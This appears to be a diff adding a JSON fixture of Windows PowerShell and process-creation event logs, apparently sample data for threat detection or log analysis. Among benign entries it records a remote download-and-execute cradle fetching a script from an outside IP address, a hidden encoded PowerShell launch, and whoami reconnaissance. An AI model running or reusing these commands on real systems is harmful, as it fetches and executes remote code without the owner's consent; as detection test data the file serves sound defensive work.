@@ -1,0 +1,10 @@
+[
+  { "TimeCreated": "2026-02-11T08:03:12Z", "Id": "4104", "ProviderName": "Microsoft-Windows-PowerShell", "Level": "Warning", "Message": "Creating Scriptblock text (1 of 1): Get-Process | Sort-Object CPU -Descending | Select-Object -First 5" },
+  { "TimeCreated": "2026-02-11T08:07:44Z", "Id": "4104", "ProviderName": "Microsoft-Windows-PowerShell", "Level": "Warning", "Message": "Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.7/a.ps1')" },
+  { "TimeCreated": "2026-02-11T08:09:01Z", "Id": "4688", "ProviderName": "Microsoft-Windows-Security-Auditing", "Level": "Information", "Message": "A new process has been created: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" },
+  { "TimeCreated": "2026-02-11T08:12:19Z", "Id": "4104", "ProviderName": "Microsoft-Windows-PowerShell", "Level": "Verbose", "Message": "Creating Scriptblock text (1 of 1): Test-Connection -ComputerName dc01 -Count 1" },
+  { "TimeCreated": "2026-02-11T08:15:52Z", "Id": "4688", "ProviderName": "Microsoft-Windows-Security-Auditing", "Level": "Information", "Message": "A new process has been created: cmd.exe /c whoami /all" },
+  { "TimeCreated": "2026-02-11T08:20:33Z", "Id": "4104", "ProviderName": "Microsoft-Windows-PowerShell", "Level": "Warning", "Message": "Creating Scriptblock text (1 of 1): [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p))" },
+  { "TimeCreated": "2026-02-11T08:24:10Z", "Id": "4104", "ProviderName": "Microsoft-Windows-PowerShell", "Level": "Verbose", "Message": "Creating Scriptblock text (1 of 1): Get-ChildItem C:\\Users -Recurse -Filter *.docx" },
+  { "TimeCreated": "2026-02-11T08:31:05Z", "Id": "4688", "ProviderName": "Microsoft-Windows-Security-Auditing", "Message": "A new process has been created: notepad.exe" }
+]
